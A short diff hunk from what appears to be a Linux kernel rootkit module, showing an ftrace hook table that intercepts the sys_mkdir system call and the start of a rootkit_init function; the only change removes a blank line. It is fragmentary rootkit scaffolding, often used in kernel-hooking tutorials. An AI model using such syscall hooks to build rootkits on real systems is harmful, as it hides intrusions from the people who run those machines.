@@ -45,7 +45,6 @@ asmlinkage int hook_mkdir(const char __user *pathname,umode_t mode)
 static struct ftrace_hook hooks[] = {
 	HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
 };
-
 static int __init rootkit_init(void)
 {
 	int err;
